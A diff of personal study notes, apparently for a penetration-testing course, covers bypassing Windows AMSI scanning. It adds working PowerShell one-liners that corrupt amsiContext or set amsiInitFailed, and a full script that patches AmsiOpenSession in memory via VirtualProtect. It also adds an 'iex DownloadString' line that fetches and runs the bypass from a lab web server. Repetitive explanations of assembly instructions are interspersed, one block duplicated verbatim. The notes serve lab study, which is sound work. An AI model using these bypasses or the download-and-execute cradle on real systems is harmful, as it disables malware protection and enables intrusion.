@@ -458,6 +458,26 @@ Here’s a simple example to hook a function in a Windows application using Frid
 
 Frida provides a powerful and flexible framework for dynamic instrumentation, allowing you to analyze and modify the behavior of applications at runtime.
 
+#### Exercises:
+	1. Modified onEnter and onExit in AmsiScanBuffer.js
+		1. If one enters 'amsiutils' in Powershell session
+
+![](Images/07-Frida-Logging.png)
+
+![](Images/07-Frida-Logging-Pwsh-Failed.png)
+
+			2. Result value of 32768 indicates a failed scan
+
+
+	2. Bypass AMSI detection on Powershell command line
+		1. couldn't break up string to bypass in Win11 (eg 'am'+'siutils')
+		2. Could use Base64 encoding to bypass
+```powershell
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaXR1aWxzCg=="))
+```
+![](Images/07-Frida-Bypass-AmsiScanner.png)
+
+
 ### Bypassing AMSI with Reflection in Powershell
 
 - Windows Defender will cause a block when obtaining a reference to a class if one is including the AmsiUtils string.
@@ -493,6 +513,266 @@ $d=$c.GetFields('NonPublic,Static')
 Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
 $g=$f.SetValue($null,$true)
 ```
+
+
+#### Exercises
+
+#### 7.3.1.1 and 7.3.1.2
+
+The assembly instruction `mov eax, 80070057h` moves the hexadecimal value `80070057h` into the `eax` register. This specific value, `0x80070057`, is a common error code in Windows that translates to `ERROR_INVALID_PARAMETER`, indicating that an invalid parameter was passed to a function.
+
+If you want to use this value in your code or in debugging scenarios, it is often useful to understand what this error code means and how to interpret it. Here's a breakdown of what the instruction does and how to use it:
+
+### Breakdown of the Instruction
+- `mov` is an assembly instruction used to move data from one place to another.
+- `eax` is one of the general-purpose registers in x86 and x86-64 architectures.
+- `80070057h` is a hexadecimal value.
+
+### Example in Context
+
+#### Assembly Example
+In an assembly language program, this instruction might be part of an error-handling routine or might be used to set up a specific error condition.
+
+```asm
+section .text
+    global _start
+
+_start:
+    mov     eax, 80070057h   ; Move the error code into the EAX register
+    ; Further instructions here
+    ; ...
+
+    ; Exit the program
+    mov     eax, 1           ; syscall number for sys_exit
+    xor     ebx, ebx         ; exit code 0
+    int     0x80             ; make the syscall
+```
+
+#### C/C++ Example
+In C or C++, you might define and use this error code as follows:
+
+```c
+#include <stdio.h>
+
+#define ERROR_INVALID_PARAMETER 0x80070057
+
+void checkErrorCode(unsigned int errorCode) {
+    if (errorCode == ERROR_INVALID_PARAMETER) {
+        printf("Error: Invalid parameter (0x%08X)\n", errorCode);
+    } else {
+        printf("Error: Unknown (0x%08X)\n", errorCode);
+    }
+}
+
+int main() {
+    unsigned int errorCode = ERROR_INVALID_PARAMETER;
+    checkErrorCode(errorCode);
+    return 0;
+}
+```
+
+### Interpretation of the Error Code
+The error code `0x80070057` is often encountered in Windows API calls and indicates that one or more parameters passed to a function are not valid. Here's how to interpret the code:
+
+- `0x8007`: The facility code, indicating it's a Win32 error.
+- `0057`: The specific error code within the facility, corresponding to `ERROR_INVALID_PARAMETER`.
+
+Understanding this error code can help diagnose issues in software development, especially when interacting with Windows APIs.
+
+### Usage in Debugging
+When debugging, especially when analyzing crash dumps or error logs, encountering this specific value in the `eax` register or as part of a function return value can indicate that an invalid parameter was passed to a function, which can guide you towards finding the root cause of a problem.
+
+### Summary
+The instruction `mov eax, 80070057h` is used to set the `eax` register to the value `0x80070057`, a common error code in Windows programming. Understanding this error code helps in diagnosing issues related to invalid parameters in function calls.
+
+In WinDbg, the command `dc rcx L1` is used to display memory contents. Let's break down the components of this command:
+
+1. **`dc`**: This command stands for "Display memory in DWORDs." It displays the contents of memory at a specified address in DWORD (4-byte) units. 
+
+2. **`rcx`**: This is the register whose value is used as the starting address for the memory display. `rcx` is one of the general-purpose registers in x86-64 architecture.
+
+3. **`L1`**: This specifies the length of the display. `L1` means to display 1 DWORD (4 bytes) of memory starting from the address in `rcx`.
+
+So, the command `dc rcx L1` in WinDbg displays 4 bytes of memory starting at the address stored in the `rcx` register.
+
+### Example
+If the `rcx` register contains the value `0x0000000140001000`, executing `dc rcx L1` might produce output similar to:
+
+```
+00000001`40001000  12345678
+```
+
+This output shows the memory address (`00000001`40001000) followed by the DWORD value (`12345678`) stored at that address.
+
+![](Images/07-Bypassing-AMSI-Windbg.png)
+In WinDbg, the command `dc rcx L1` is used to display memory contents. Let's break down the components of this command:
+
+1. **`dc`**: This command stands for "Display memory in DWORDs." It displays the contents of memory at a specified address in DWORD (4-byte) units. 
+
+2. **`rcx`**: This is the register whose value is used as the starting address for the memory display. `rcx` is one of the general-purpose registers in x86-64 architecture.
+
+3. **`L1`**: This specifies the length of the display. `L1` means to display 1 DWORD (4 bytes) of memory starting from the address in `rcx`.
+
+So, the command `dc rcx L1` in WinDbg displays 4 bytes of memory starting at the address stored in the `rcx` register.
+
+In the above image, the contents of AMSI Header value was overwritten.
+
+#### 7.3.1.3 Bypassing AMSI by modifying amsiContext field
+
+*Note:* This works on the lab Windows 10 (build 17763), but fails with current versions
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+
+#### 7.3.2.1
+
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iInitFailed") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,$true)
+```
+#### 7.4.1.1
+
+The command `u amsi!AmsiOpenSession L1A` in WinDbg is used to disassemble code. Here's what each part means:
+
+1. **`u`**: This command stands for "Unassemble," which means to disassemble the code at a specified address or symbol.
+    
+2. **`amsi!AmsiOpenSession`**: This specifies the starting address for the disassembly. `amsi` is the module name, and `AmsiOpenSession` is a function within that module. The exclamation mark (`!`) separates the module name from the symbol name.
+    
+3. **`L1A`**: This specifies the length of the disassembly in instructions. `L1A` means to disassemble 0x1A (26) instructions starting from the address of `AmsiOpenSession`.
+    
+
+So, the command `u amsi!AmsiOpenSession L1A` tells WinDbg to disassemble 26 instructions starting at the beginning of the `AmsiOpenSession` function within the `amsi` module.
+
+The `test rcx, rcx` instruction in assembly language is used to perform a bitwise AND operation between the `rcx` register and itself. This operation sets the processor's flags based on the result, but does not store the result anywhere. Essentially, it is used to check whether the value in `rcx` is zero or not.
+
+### Explanation
+
+- **Opcode**: `test`
+- **Operands**: `rcx, rcx`
+
+The `test` instruction performs a bitwise AND operation between its two operands and sets the Zero Flag (ZF) in the EFLAGS register accordingly:
+- If `rcx` is zero, the Zero Flag (ZF) is set to 1.
+- If `rcx` is non-zero, the Zero Flag (ZF) is cleared to 0.
+
+This is typically used to test if a register (or memory location) contains zero, without modifying the contents of the register. It is often used in conditional statements like loops or if statements to decide the flow of execution.
+
+### Example
+
+```assembly
+mov rcx, 0        ; Load 0 into rcx
+test rcx, rcx     ; Test if rcx is zero
+jz zero_label     ; Jump to zero_label if Zero Flag is set
+
+mov rcx, 1234h    ; Load a non-zero value into rcx
+test rcx, rcx     ; Test if rcx is zero
+jnz non_zero_label; Jump to non_zero_label if Zero Flag is not set
+
+zero_label:
+    ; Code to execute if rcx is zero
+
+non_zero_label:
+    ; Code to execute if rcx is non-zero
+```
+
+In this example:
+- The first `test rcx, rcx` sets the Zero Flag because `rcx` is zero, so the `jz` (jump if zero) instruction will jump to `zero_label`.
+- The second `test rcx, rcx` clears the Zero Flag because `rcx` is non-zero, so the `jnz` (jump if not zero) instruction will jump to `non_zero_label`.
+
+The `cmp qword ptr [rcx+8], 0` instruction in assembly language is used to compare the value stored at the memory location `[rcx + 8]` with zero. It performs a subtraction of `0` from the value at `[rcx + 8]`, but it does not store the result. Instead, it updates the processor's flags based on the result of this subtraction, which can then be used for conditional branching.
+
+### Explanation
+
+- **Opcode**: `cmp`
+- **Operands**: `qword ptr [rcx+8]`, `0`
+
+Here, `qword ptr [rcx+8]` specifies that the operation should consider a 64-bit (8-byte) value at the memory location computed by adding 8 to the value in the `rcx` register. The `cmp` instruction subtracts `0` from this value and sets the CPU flags accordingly, without modifying the value at `[rcx+8]`.
+
+### Flags Affected
+- **Zero Flag (ZF)**: Set if the value at `[rcx+8]` is zero.
+- **Sign Flag (SF)**: Set according to the sign of the result (i.e., the value at `[rcx+8]`).
+- **Carry Flag (CF)**: Set if a borrow occurs (not relevant here since we're subtracting 0).
+- **Overflow Flag (OF)**: Set if signed overflow occurs.
+
+### Example
+
+```assembly
+mov rcx, rsi         ; Assume rsi points to a structure
+cmp qword ptr [rcx+8], 0  ; Compare the 64-bit value at offset 8 from rcx with 0
+je value_is_zero     ; Jump to value_is_zero if the value is zero
+jne value_is_nonzero ; Jump to value_is_nonzero if the value is non-zero
+
+value_is_zero:
+    ; Code to execute if the value at [rcx + 8] is zero
+    ...
+
+value_is_nonzero:
+    ; Code to execute if the value at [rcx + 8] is non-zero
+    ...
+```
+
+In this example:
+- The `mov rcx, rsi` instruction sets up the `rcx` register to point to a structure or memory block.
+- The `cmp qword ptr [rcx+8], 0` instruction checks whether the 64-bit value located at the address `rcx + 8` is zero.
+- The `je` (jump if equal) instruction will jump to the `value_is_zero` label if the value at `[rcx + 8]` is zero.
+- The `jne` (jump if not equal) instruction will jump to the `value_is_nonzero` label if the value at `[rcx + 8]` is non-zero.
+
+Change `rcx+8` to `0` to bypass AMSI in Windbg
+
+![](Images/07-Bypassing-AMSI-Windbg-OpenSession.png)
+
+
+#### 7.4.2.1
+
+```powershell
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48, 0x31, 0xC0) 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+```
+
+- Download from web server 
+```powershell
+ iex (New-Object Net.WebClient).DownloadString('http://192.168.45.176:8000/07AMSIBypass.ps1')
+```
 ### TODO: Try doing AMSI bypass in C#
 
 ### TODO 7.4.2 Q2 
@@ -514,6 +794,7 @@ Create a similar AMSI bypass but instead of modifying the code of _AmsiOpenSessi
 	- throws error
 	- look in jscript.dll using `lmDvmjscript`
 	- find functions in jscript.dll  that are like jscript!j* using `x /D /f jscript!jA*`
+	
 ![](Images/WindbgSearchingForJscriptAMSI.png)
 
 On Win 10 build 17763 (Offsec lab):
@@ -524,8 +805,10 @@ On Win 10 build 17763 (Offsec lab):
 
 - Start debugging session
 - `bu amsi!AmsiScanBuffer`
+
 ![First hit of AmsiScanBuffer in Windbg](Images/WscriptJsAmsiScanBufferHit.png)
 - look at the next 20 instructions `u rip L20`
+
 ![Next 20 Instructions](Images/WindbgAmsiScanBufferNext20Instructions.png)
 
 
